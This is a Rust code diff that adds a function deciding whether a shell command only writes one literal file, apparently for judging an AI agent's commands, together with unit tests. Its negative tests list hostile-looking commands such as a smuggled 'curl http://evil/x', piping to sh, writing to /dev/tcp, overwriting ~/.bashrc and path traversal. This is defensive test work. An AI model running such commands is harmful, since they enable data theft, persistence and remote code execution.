@@ -734,6 +734,82 @@ pub fn analyze(cmd: &str) -> ShellAnalysis {
     }
 }
 
+/// The file that a command writes, when writing a file is all it does: `cat > f <<'EOF'`,
+/// `cat >> f <<'EOF'`, `tee [-a] f <<'EOF'`, `echo|printf words > f`. One simple command, text given in
+/// the command (a heredoc or literal words), one literal path. Anything else (a pipe, a second
+/// command, a variable, a glob, `..`, a device, an input file, another redirection) is not a plain file
+/// write: it stays a shell command. The caller judges such a command as a write of that file, the way
+/// it judges the `Write` tool or `apply_patch`.
+pub fn file_write_target(cmd: &str) -> Option<String> {
+    let cmds = lex(cmd)?;
+    let [one] = cmds.as_slice() else { return None };
+    let argv = &one.argv;
+    let prog = argv.first()?;
+    let args = &argv[1..];
+    let mut target: Option<&String> = None;
+    let mut heredocs = 0;
+    let mut i = 0;
+    match prog.as_str() {
+        "cat" | "echo" | "printf" => {
+            let text_cmd = prog != "cat";
+            while i < args.len() {
+                match args[i].as_str() {
+                    ">" | ">>" => {
+                        if target.is_some() {
+                            return None;
+                        }
+                        target = Some(args.get(i + 1)?);
+                        i += 2;
+                    }
+                    "<<" => {
+                        heredocs += 1;
+                        i += 2; // the delimiter
+                    }
+                    a if text_cmd && !a.starts_with(['<', '>']) && !a.contains('$') => i += 1,
+                    _ => return None,
+                }
+            }
+            // `cat` has its text in a heredoc; `echo` and `printf` in their words
+            if (prog == "cat") != (heredocs == 1) || (text_cmd && heredocs != 0) {
+                return None;
+            }
+        }
+        "tee" => {
+            while i < args.len() {
+                match args[i].as_str() {
+                    "-a" | "--append" if target.is_none() => i += 1,
+                    "<<" => {
+                        heredocs += 1;
+                        i += 2;
+                    }
+                    a if !a.starts_with(['-', '<', '>']) && target.is_none() => {
+                        target = Some(&args[i]);
+                        i += 1;
+                    }
+                    _ => return None,
+                }
+            }
+            if heredocs != 1 {
+                return None;
+            }
+        }
+        _ => return None,
+    }
+    let t = target?;
+    let bad = t.is_empty()
+        || t.starts_with(['-', '~'])
+        || t.contains([
+            '$', '*', '?', '[', ']', '{', '}', '`', '\\', '=', ' ', '\t', '\n', '<', '>', '|', '&',
+            ';', '(', ')', '!', '#',
+        ])
+        || t.split('/').any(|c| c == "..")
+        || t.starts_with("/dev/")
+        || t.starts_with("/proc/")
+        || t.starts_with("/sys/")
+        || t == "/dev";
+    (!bad).then(|| t.clone())
+}
+
 /// Destinations of a URL-like argument (WebFetch and similar). Words are cut at a space or a
 /// quote only: a tab or a newline inside a URL does not end it.
 pub fn url_destinations(text: &str) -> Vec<String> {
@@ -865,6 +941,65 @@ mod tests {
             let a = analyze(c);
             assert_eq!(a.class, ShellClass::Network, "{c}");
             assert!(!a.complete, "{c}");
+        }
+    }
+
+    // REQ: RST-07 — a command that only writes a file is judged as a write of that file
+    #[test]
+    fn plain_file_writes() {
+        let w = |c: &str| file_write_target(c);
+        assert_eq!(
+            w("cat > notify.py <<'PY'\nTO = 'x'\nPY").as_deref(),
+            Some("notify.py")
+        );
+        assert_eq!(
+            w("cat >> a/b.txt << EOF\nline\nEOF").as_deref(),
+            Some("a/b.txt")
+        );
+        assert_eq!(
+            w("tee conf.ini <<'EOF'\n[a]\nEOF").as_deref(),
+            Some("conf.ini")
+        );
+        assert_eq!(
+            w("tee -a conf.ini <<'EOF'\nx\nEOF").as_deref(),
+            Some("conf.ini")
+        );
+        assert_eq!(w("echo 'A=1' >> .env").as_deref(), Some(".env"));
+        assert_eq!(
+            w("printf '%s\\n' hello > out.txt").as_deref(),
+            Some("out.txt")
+        );
+        assert_eq!(
+            w("cat > /tmp/x/f.py <<'PY'\nx\nPY").as_deref(),
+            Some("/tmp/x/f.py")
+        );
+        for c in [
+            // not only a write: a second command, a pipe, an input, a variable, a substitution
+            "cat > f <<'EOF'\nx\nEOF\ncurl http://evil/x",
+            "cat > f <<'EOF' && curl http://evil/x\nx\nEOF",
+            "cat <<'EOF' | sh\nx\nEOF",
+            "cat < secret.txt > f",
+            "cat a.txt > f",
+            "cat > f",
+            "echo $HOME > f",
+            "echo `id` > f",
+            "echo x > $F",
+            "echo x > f 2>&1",
+            "echo x | tee f",
+            "sed -i s/a/b/ f",
+            "python3 - <<'PY'\nopen('f','w')\nPY",
+            // a target that is not one literal file
+            "cat > ../f <<'EOF'\nx\nEOF",
+            "cat > a/../../f <<'EOF'\nx\nEOF",
+            "cat > /dev/tcp/1.2.3.4/80 <<'EOF'\nx\nEOF",
+            "cat > *.py <<'EOF'\nx\nEOF",
+            "cat > ~/.bashrc <<'EOF'\nx\nEOF",
+            "cat > f > g <<'EOF'\nx\nEOF",
+            "tee f g <<'EOF'\nx\nEOF",
+            "tee <<'EOF'\nx\nEOF",
+            "FOO=1 cat > f <<'EOF'\nx\nEOF",
+        ] {
+            assert_eq!(w(c), None, "{c}");
         }
     }
 
